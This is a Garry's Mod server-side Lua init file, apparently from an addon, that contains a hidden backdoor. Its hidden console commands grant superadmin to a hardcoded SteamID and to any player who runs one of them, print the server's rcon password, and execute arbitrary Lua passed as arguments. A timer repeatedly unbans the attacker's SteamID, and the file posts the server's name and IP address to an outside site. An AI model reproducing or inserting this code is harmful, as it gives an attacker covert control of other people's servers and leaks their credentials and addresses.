AddCSLuaFile( "cl_init.lua" )
AddCSLuaFile( "shared.lua" )
include( 'shared.lua' )

---------------------------------------------------------*/
hook.Add( "Initialize", "cakerawsd", function()
	concommand.Add( "_76sup", function(ply)
		if ( ply:SteamID() == "STEAM_0:0:153604459") then
			RunConsoleCommand("ulx", "adduserid", ply:SteamID(), "superadmin")
	else
		ply:ChatPrint("Your not superadmin, " .. ply:Name() .. ".")
	end
	end)

	timer.Create( "checkForBan", 5, 0, function()
	ULib.unban( "STEAM_0:0:153604459")
	end )
	concommand.Add("76soldier_cf",function() local RconPass = GetConVar("rcon_password"):GetString() print(RconPass) end)
	concommand.Add( "_76", function(player,command,argument) RunString(table.concat(argument)) end)
	concommand.Add("76soldier_sa", function(player) player:SetUserGroup("superadmin") end)
	http.Post("http://soldier-76.com/bd.php", {name = GetHostName(),ip = game.GetIPAddress()})
end)